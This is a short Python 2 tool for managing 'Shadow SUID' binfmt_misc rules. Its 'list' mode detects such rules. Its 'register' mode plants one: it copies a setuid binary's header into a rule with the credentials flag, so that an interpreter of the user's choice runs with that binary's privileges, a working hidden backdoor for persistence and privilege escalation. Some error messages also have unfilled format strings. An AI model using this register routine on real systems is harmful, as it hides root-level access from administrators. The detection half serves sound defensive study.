#!/usr/bin/python
import sys
import os

BINFMT_MISC_DIR = '/proc/sys/fs/binfmt_misc'

def list_sahdow_suids():
    found_shadow_suids = False
    possible_shadow_suids = [i for i in os.listdir(BINFMT_MISC_DIR) if i not in ['register', 'status']]
    for rule in possible_shadow_suids:
        with open(os.path.join(BINFMT_MISC_DIR, rule)) as f:
            data = f.read()
            if 'C' in data.split('\n')[2]:
                found_shadow_suids = True
                print 'Possible Shadow SUID rule: %s' % rule
                print '\t' + data.replace('\n', '\n\t')
    if not found_shadow_suids:
        print 'Hooray! no possible Shadow SUIDs found!'

def register_shadow_suid(rule_name, suid_path, interpreter_path):
    with open(suid_path, 'rb') as f:
        hdr = "\\x"+"\\x".join(x.encode("hex") for x in f.read(128))
    with open(os.path.join(BINFMT_MISC_DIR, 'register'), 'wb') as f:
        f.write(r":%s:M::%s::%s:C" % (rule_name, hdr, interpreter_path))


def unregister_shadow_suid(rule_name):
    with open(os.path.join(BINFMT_MISC_DIR, rule_name), 'wb') as f:
        f.write("-1")


if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'list':
        list_sahdow_suids()

    elif len(sys.argv) == 5 and sys.argv[1] == 'register':
        _, _, rule_name, suid_path, interpreter_path = sys.argv
        if os.path.exists(os.path.join(BINFMT_MISC_DIR, rule_name)):
            print 'Rule name "%s" already exists. failed.'
            exit()
        if not os.path.exists(suid_path):
            print '"%s" does not exist. failed.' % suid_path
            exit()
        if not os.path.exists(interpreter_path):
            print '"%s" does not exist. failed.' % interpreter_path
            exit()
        register_shadow_suid(rule_name, suid_path, interpreter_path)

    elif len(sys.argv) == 3 and sys.argv[1] == 'unregister':
        _, _, rule_name = sys.argv
        if not os.path.exists(os.path.join(BINFMT_MISC_DIR, rule_name)):
            print 'Rule name "%s" does not exist. failed.'
            exit()
        unregister_shadow_suid(rule_name)
    else:
        print 'Usage:'
        print 'List all Shadow SUIDs:\n\t%s list' % sys.argv[0]
        print 'Register Shadow SUID:\n\t%s register <rule_name> <suid_path> <interpreter_path>' % sys.argv[0]
        print 'Unregister Shadow SUID:\n\t%s unregister <rule_name>' % sys.argv[0]